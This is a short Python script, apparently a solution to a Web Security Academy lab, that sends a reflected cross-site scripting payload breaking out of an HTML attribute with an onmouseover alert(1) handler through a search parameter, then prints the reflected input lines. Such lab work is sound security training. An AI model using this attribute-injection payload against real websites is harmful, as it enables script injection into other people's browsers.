import requests

site = 'aca41fdd1e90b3a4c0cf5a51005e00ef.web-security-academy.net'
s = requests.Session()


if __name__ == '__main__':
    odin_id = 'bradlet2'
    search_term = f'''{odin_id}" onmouseover="alert(1)'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    for line in resp.text.split('\n'):
        if 'input' in line:
            print(line)
